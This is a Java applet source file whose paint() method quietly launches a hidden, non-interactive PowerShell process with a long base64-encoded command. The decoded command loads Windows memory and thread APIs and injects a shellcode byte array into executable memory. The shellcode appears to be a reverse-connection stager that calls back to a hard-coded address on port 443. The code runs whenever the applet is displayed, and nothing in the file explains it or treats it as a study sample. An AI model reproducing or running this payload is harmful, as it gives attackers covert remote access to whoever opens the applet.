
import java.io.PrintWriter;
import java.io.OutputStreamWriter;
import java.io.BufferedOutputStream;
import java.io.IOException;
import java.util.List; 
import java.awt.*;
import java.awt.event.*;
import java.applet.*;
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.io.PrintStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import static java.lang.System.out;

public class AppletApplication2 extends Applet 
{
    public static final int IDEAL_WIDTH = 640;
    public static final int IDEAL_HEIGHT = 480;
     

  public void paint(Graphics g)
  {
	ProcessBuilder pb1;
    ProcessBuilder pb;
    Process p;
    Process p1;
    boolean closed = false;
    PrintWriter writer;
    //List<String> params2 = java.util.Arrays.asList("cmd.exe","dir");
    
    
    List<String> params3 = java.util.Arrays.asList("powershell.exe", "-windowstyle", "hidden", "-noninteractive","-EncodedCommand","JABjAG8AZABlACAAPQAgACcAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABWAGkAcgB0AHUAYQBsAEEAbABsAG8AYwAoAEkAbgB0AFAAdAByACAAbABwAEEAZABkAHIAZQBzAHMALAAgAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABBAGwAbABvAGMAYQB0AGkAbwBuAFQAeQBwAGUALAAgAHUAaQBuAHQAIABmAGwAUAByAG8AdABlAGMAdAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABDAHIAZQBhAHQAZQBUAGgAcgBlAGEAZAAoAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEEAdAB0AHIAaQBiAHUAdABlAHMALAAgAHUAaQBuAHQAIABkAHcAUwB0AGEAYwBrAFMAaQB6AGUALAAgAEkAbgB0AFAAdAByACAAbABwAFMAdABhAHIAdABBAGQAZAByAGUAcwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABQAGEAcgBhAG0AZQB0AGUAcgAsACAAdQBpAG4AdAAgAGQAdwBDAHIAZQBhAHQAaQBvAG4ARgBsAGEAZwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABUAGgAcgBlAGEAZABJAGQAKQA7AFsARABsAGwASQBtAHAAbwByAHQAKAAiAG0AcwB2AGMAcgB0AC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABtAGUAbQBzAGUAdAAoAEkAbgB0AFAAdAByACAAZABlAHMAdAAsACAAdQBpAG4AdAAgAHMAcgBjACwAIAB1AGkAbgB0ACAAYwBvAHUAbgB0ACkAOwAnADsAJAB3AGkAbgBGAHUAbgBjACAAPQAgAEEAZABkAC0AVAB5AHAAZQAgAC0AbQBlAG0AYgBlAHIARABlAGYAaQBuAGkAdABpAG8AbgAgACQAYwBvAGQAZQAgAC0ATgBhAG0AZQAgACIAVwBpAG4AMwAyACIAIAAtAG4AYQBtAGUAcwBwAGEAYwBlACAAVwBpAG4AMwAyAEYAdQBuAGMAdABpAG8AbgBzACAALQBwAGEAcwBzAHQAaAByAHUAOwBbAEIAeQB0AGUAWwBdAF0AOwBbAEIAeQB0AGUAWwBdAF0AJABzAGMANgA0ACAAPQAgADAAeABmAGMALAAwAHgANAA4ACwAMAB4ADgAMwAsADAAeABlADQALAAwAHgAZgAwACwAMAB4AGUAOAAsADAAeABjADAALAAwAHgAMAAwACwAMAB4ADAAMAAsADAAeAAwADAALAAwAHgANAAxACwAMAB4ADUAMQAsADAAeAA0ADEALAAwAHgANQAwACwAMAB4ADUAMgAsADAAeAA1ADEALAAwAHgANQA2ACwAMAB4ADQAOAAsADAAeAAzADEALAAwAHgAZAAyACwAMAB4ADYANQAsADAAeAA0ADgALAAwAHgAOABiACwAMAB4ADUAMgAsADAAeAA2ADAALAAwAHgANAA4ACwAMAB4ADgAYgAsADAAeAA1ADIALAAwAHgAMQA4ACwAMAB4ADQAOAAsADAAeAA4AGIALAAwAHgANQAyACwAMAB4ADIAMAAsADAAeAA0ADgALAAwAHgAOABiACwAMAB4ADcAMgAsADAAeAA1ADAALAAwAHgANAA4ACwAMAB4ADAAZgAsADAAeABiADcALAAwAHgANABhACwAMAB4ADQAYQAsADAAeAA0AGQALAAwAHgAMwAxACwAMAB4AGMAOQAsADAAeAA0ADgALAAwAHgAMwAxACwAMAB4AGMAMAAsADAAeABhAGMALAAwAHgAMwBjACwAMAB4ADYAMQAsADAAeAA3AGMALAAwAHgAMAAyACwAMAB4ADIAYwAsADAAeAAyADAALAAwAHgANAAxACwAMAB4AGMAMQAsADAAeABjADkALAAwAHgAMABkACwAMAB4ADQAMQAsADAAeAAwADEALAAwAHgAYwAxACwAMAB4AGUAMgAsADAAeABlAGQALAAwAHgANQAyACwAMAB4ADQAMQAsADAAeAA1ADEALAAwAHgANAA4ACwAMAB4ADgAYgAsADAAeAA1ADIALAAwAHgAMgAwACwAMAB4ADgAYgAsADAAeAA0ADIALAAwAHgAMwBjACwAMAB4ADQAOAAsADAAeAAwADEALAAwAHgAZAAwACwAMAB4ADgAYgAsADAAeAA4ADAALAAwAHgAOAA4ACwAMAB4ADAAMAAsADAAeAAwADAALAAwAHgAMAAwACwAMAB4ADQAOAAsADAAeAA4ADUALAAwAHgAYwAwACwAMAB4ADcANAAsADAAeAA2ADcALAAwAHgANAA4ACwAMAB4ADAAMQAsADAAeABkADAALAAwAHgANQAwACwAMAB4ADgAYgAsADAAeAA0ADgALAAwAHgAMQA4ACwAMAB4ADQANAAsADAAeAA4AGIALAAwAHgANAAwACwAMAB4ADIAMAAsADAAeAA0ADkALAAwAHgAMAAxACwAMAB4AGQAMAAsADAAeABlADMALAAwAHgANQA2ACwAMAB4ADQAOAAsADAAeABmAGYALAAwAHgAYwA5ACwAMAB4ADQAMQAsADAAeAA4AGIALAAwAHgAMwA0ACwAMAB4ADgAOAAsADAAeAA0ADgALAAwAHgAMAAxACwAMAB4AGQANgAsADAAeAA0AGQALAAwAHgAMwAxACwAMAB4AGMAOQAsADAAeAA0ADgALAAwAHgAMwAxACwAMAB4AGMAMAAsADAAeABhAGMALAAwAHgANAAxACwAMAB4AGMAMQAsADAAeABjADkALAAwAHgAMABkACwAMAB4ADQAMQAsADAAeAAwADEALAAwAHgAYwAxACwAMAB4ADMAOAAsADAAeABlADAALAAwAHgANwA1ACwAMAB4AGYAMQAsADAAeAA0AGMALAAwAHgAMAAzACwAMAB4ADQAYwAsADAAeAAyADQALAAwAHgAMAA4ACwAMAB4ADQANQAsADAAeAAzADkALAAwAHgAZAAxACwAMAB4ADcANQAsADAAeABkADgALAAwAHgANQA4ACwAMAB4ADQANAAsADAAeAA4AGIALAAwAHgANAAwACwAMAB4ADIANAAsADAAeAA0ADkALAAwAHgAMAAxACwAMAB4AGQAMAAsADAAeAA2ADYALAAwAHgANAAxACwAMAB4ADgAYgAsADAAeAAwAGMALAAwAHgANAA4ACwAMAB4ADQANAAsADAAeAA4AGIALAAwAHgANAAwACwAMAB4ADEAYwAsADAAeAA0ADkALAAwAHgAMAAxACwAMAB4AGQAMAAsADAAeAA0ADEALAAwAHgAOABiACwAMAB4ADAANAAsADAAeAA4ADgALAAwAHgANAA4ACwAMAB4ADAAMQAsADAAeABkADAALAAwAHgANAAxACwAMAB4ADUAOAAsADAAeAA0ADEALAAwAHgANQA4ACwAMAB4ADUAZQAsADAAeAA1ADkALAAwAHgANQBhACwAMAB4ADQAMQAsADAAeAA1ADgALAAwAHgANAAxACwAMAB4ADUAOQAsADAAeAA0ADEALAAwAHgANQBhACwAMAB4ADQAOAAsADAAeAA4ADMALAAwAHgAZQBjACwAMAB4ADIAMAAsADAAeAA0ADEALAAwAHgANQAyACwAMAB4AGYAZgAsADAAeABlADAALAAwAHgANQA4ACwAMAB4ADQAMQAsADAAeAA1ADkALAAwAHgANQBhACwAMAB4ADQAOAAsADAAeAA4AGIALAAwAHgAMQAyACwAMAB4AGUAOQAsADAAeAA1ADcALAAwAHgAZgBmACwAMAB4AGYAZgAsADAAeABmAGYALAAwAHgANQBkACwAMAB4ADQAOQAsADAAeABiAGUALAAwAHgANwA3ACwAMAB4ADcAMwAsADAAeAAzADIALAAwAHgANQBmACwAMAB4ADMAMwAsADAAeAAzADIALAAwAHgAMAAwACwAMAB4ADAAMAAsADAAeAA0ADEALAAwAHgANQA2ACwAMAB4ADQAOQAsADAAeAA4ADkALAAwAHgAZQA2ACwAMAB4ADQAOAAsADAAeAA4ADEALAAwAHgAZQBjACwAMAB4AGEAMAAsADAAeAAwADEALAAwAHgAMAAwACwAMAB4ADAAMAAsADAAeAA0ADkALAAwAHgAOAA5ACwAMAB4AGUANQAsADAAeAA0ADkALAAwAHgAYgBjACwAMAB4ADAAMgAsADAAeAAwADAALAAwAHgAMAAxACwAMAB4AGIAYgAsADAAeABjADAALAAwAHgAYQA4ACwAMAB4ADIAYQAsADAAeAA4ADEALAAwAHgANAAxACwAMAB4ADUANAAsADAAeAA0ADkALAAwAHgAOAA5ACwAMAB4AGUANAAsADAAeAA0AGMALAAwAHgAOAA5ACwAMAB4AGYAMQAsADAAeAA0ADEALAAwAHgAYgBhACwAMAB4ADQAYwAsADAAeAA3ADcALAAwAHgAMgA2ACwAMAB4ADAANwAsADAAeABmAGYALAAwAHgAZAA1ACwAMAB4ADQAYwAsADAAeAA4ADkALAAwAHgAZQBhACwAMAB4ADYAOAAsADAAeAAwADEALAAwAHgAMAAxACwAMAB4ADAAMAAsADAAeAAwADAALAAwAHgANQA5ACwAMAB4ADQAMQAsADAAeABiAGEALAAwAHgAMgA5ACwAMAB4ADgAMAAsADAAeAA2AGIALAAwAHgAMAAwACwAMAB4AGYAZgAsADAAeABkADUALAAwAHgANQAwACwAMAB4ADUAMAAsADAAeAA0AGQALAAwAHgAMwAxACwAMAB4AGMAOQAsADAAeAA0AGQALAAwAHgAMwAxACwAMAB4AGMAMAAsADAAeAA0ADgALAAwAHgAZgBmACwAMAB4AGMAMAAsADAAeAA0ADgALAAwAHgAOAA5ACwAMAB4AGMAMgAsADAAeAA0ADgALAAwAHgAZgBmACwAMAB4AGMAMAAsADAAeAA0ADgALAAwAHgAOAA5ACwAMAB4AGMAMQAsADAAeAA0ADEALAAwAHgAYgBhACwAMAB4AGUAYQAsADAAeAAwAGYALAAwAHgAZABmACwAMAB4AGUAMAAsADAAeABmAGYALAAwAHgAZAA1ACwAMAB4ADQAOAAsADAAeAA4ADkALAAwAHgAYwA3ACwAMAB4ADYAYQAsADAAeAAxADAALAAwAHgANAAxACwAMAB4ADUAOAAsADAAeAA0AGMALAAwAHgAOAA5ACwAMAB4AGUAMgAsADAAeAA0ADgALAAwAHgAOAA5ACwAMAB4AGYAOQAsADAAeAA0ADEALAAwAHgAYgBhACwAMAB4ADkAOQAsADAAeABhADUALAAwAHgANwA0ACwAMAB4ADYAMQAsADAAeABmAGYALAAwAHgAZAA1ACwAMAB4ADQAOAAsADAAeAA4ADEALAAwAHgAYwA0ACwAMAB4ADQAMAAsADAAeAAwADIALAAwAHgAMAAwACwAMAB4ADAAMAAsADAAeAA0ADgALAAwAHgAOAAzACwAMAB4AGUAYwAsADAAeAAxADAALAAwAHgANAA4ACwAMAB4ADgAOQAsADAAeABlADIALAAwAHgANABkACwAMAB4ADMAMQAsADAAeABjADkALAAwAHgANgBhACwAMAB4ADAANAAsADAAeAA0ADEALAAwAHgANQA4ACwAMAB4ADQAOAAsADAAeAA4ADkALAAwAHgAZgA5ACwAMAB4ADQAMQAsADAAeABiAGEALAAwAHgAMAAyACwAMAB4AGQAOQAsADAAeABjADgALAAwAHgANQBmACwAMAB4AGYAZgAsADAAeABkADUALAAwAHgANAA4ACwAMAB4ADgAMwAsADAAeABjADQALAAwAHgAMgAwACwAMAB4ADUAZQAsADAAeAA2AGEALAAwAHgANAAwACwAMAB4ADQAMQAsADAAeAA1ADkALAAwAHgANgA4ACwAMAB4ADAAMAAsADAAeAAxADAALAAwAHgAMAAwACwAMAB4ADAAMAAsADAAeAA0ADEALAAwAHgANQA4ACwAMAB4ADQAOAAsADAAeAA4ADkALAAwAHgAZgAyACwAMAB4ADQAOAAsADAAeAAzADEALAAwAHgAYwA5ACwAMAB4ADQAMQAsADAAeABiAGEALAAwAHgANQA4ACwAMAB4AGEANAAsADAAeAA1ADMALAAwAHgAZQA1ACwAMAB4AGYAZgAsADAAeABkADUALAAwAHgANAA4ACwAMAB4ADgAOQAsADAAeABjADMALAAwAHgANAA5ACwAMAB4ADgAOQAsADAAeABjADcALAAwAHgANABkACwAMAB4ADMAMQAsADAAeABjADkALAAwAHgANAA5ACwAMAB4ADgAOQAsADAAeABmADAALAAwAHgANAA4ACwAMAB4ADgAOQAsADAAeABkAGEALAAwAHgANAA4ACwAMAB4ADgAOQAsADAAeABmADkALAAwAHgANAAxACwAMAB4AGIAYQAsADAAeAAwADIALAAwAHgAZAA5ACwAMAB4AGMAOAAsADAAeAA1AGYALAAwAHgAZgBmACwAMAB4AGQANQAsADAAeAA0ADgALAAwAHgAMAAxACwAMAB4AGMAMwAsADAAeAA0ADgALAAwAHgAMgA5ACwAMAB4AGMANgAsADAAeAA0ADgALAAwAHgAOAA1ACwAMAB4AGYANgAsADAAeAA3ADUALAAwAHgAZQAxACwAMAB4ADQAMQAsADAAeABmAGYALAAwAHgAZQA3ADsAWwBCAHkAdABlAFsAXQBdACQAcwBjACAAPQAgACQAcwBjADYANAA7ACQAcwBpAHoAZQAgAD0AIAAwAHgAMQAwADAAMAA7AGkAZgAgACgAJABzAGMALgBMAGUAbgBnAHQAaAAgAC0AZwB0ACAAMAB4ADEAMAAwADAAKQAgAHsAJABzAGkAegBlACAAPQAgACQAcwBjAC4ATABlAG4AZwB0AGgAfQA7ACQAeAA9ACQAdwBpAG4ARgB1AG4AYwA6ADoAVgBpAHIAdAB1AGEAbABBAGwAbABvAGMAKAAwACwAMAB4ADEAMAAwADAALAAkAHMAaQB6AGUALAAwAHgANAAwACkAOwBmAG8AcgAgACgAJABpAD0AMAA7ACQAaQAgAC0AbABlACAAKAAkAHMAYwAuAEwAZQBuAGcAdABoAC0AMQApADsAJABpACsAKwApACAAewAkAHcAaQBuAEYAdQBuAGMAOgA6AG0AZQBtAHMAZQB0ACgAWwBJAG4AdABQAHQAcgBdACgAJAB4AC4AVABvAEkAbgB0ADMAMgAoACkAKwAkAGkAKQAsACAAJABzAGMAWwAkAGkAXQAsACAAMQApAH0AOwAkAHcAaQBuAEYAdQBuAGMAOgA6AEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACgAMAAsADAALAAkAHgALAAwACwAMAAsADAAKQA7AGYAbwByACAAKAA7ADsAKQAgAHsAIABTAHQAYQByAHQALQBzAGwAZQBlAHAAIAA2ADAAIAB9ADsA");
    //pb1 = new java.lang.ProcessBuilder(params2);
    pb = new java.lang.ProcessBuilder(params3);
    g.setColor(Color.BLACK);
    FontMetrics fm = g.getFontMetrics();
    int y = fm.getHeight();
    
    
     
	try {
            
        for (String s : params3){
       	//System.out.print("Data of message" +params3.indexOf(s)+" "+s);
       	 g.drawString("Data of " + params3.toString(),10,y);
        }
        //p1 = pb1.start(); 
        p = pb.start();          
            
            //System.out.print("========== Executed power meta 1" + pb.environment());
        } catch (IOException ex) {
            throw new java.lang.RuntimeException("Cannot execute PowerShell.exe", ex);
        }
        
       
	writer = new java.io.PrintWriter(new java.io.OutputStreamWriter(new java.io.BufferedOutputStream(p.getOutputStream())), true);
    Gob outGob = new Gob(p.getInputStream(), System.out);
    Gob errGob = new Gob(p.getErrorStream(), System.out);
    Thread outThread = new java.lang.Thread(outGob);
    Thread errThread = new java.lang.Thread(errGob); 
	    
        outThread.start();
        errThread.start();
        
        outGob.run();
        System.out.print("Data of message" +outGob.getM());
        
        System.out.print("threads are running");
        
        //Thread.sleep(3000);
        
        System.exit(0);
        
    
  }

  @SuppressWarnings("deprecation")
public static void main(String args[])
  {
        
    Applet applet = new AppletApplication2();
    Frame frame = new Frame();
    frame.addWindowListener(new WindowAdapter()
    {
      public void windowClosing(WindowEvent e)
      {
        System.exit(0);
      }
    });

    frame.add(applet);
    frame.setSize(IDEAL_WIDTH,IDEAL_HEIGHT);
    frame.show();
  }
}

class Gob implements Runnable {
    PrintStream out;
    String message;
    String buffer;
    BufferedReader reader;

    public Gob(InputStream inputStream, PrintStream out) {
        this.reader = new java.io.BufferedReader(new java.io.InputStreamReader(inputStream));
               this.out = out;
               System.out.println("out : " + out);
        this.message = ( null != message ) ? message : "";
    }

    public String getM() {
    	System.out.println("message in gob : " + message);
       return this.message; 
    }
    
    public void run() {
        String line;

        try {
            while (null != (line = this.reader.readLine())) {
                out.print(message + line);
                System.out.println("reader: " + message + line);  
            }
            System.out.println("reader 2: " + message + line);
            this.reader.close();
        } catch (IOException e) {
            System.err.print("ERROR: " + e.getMessage());
        }
    }
}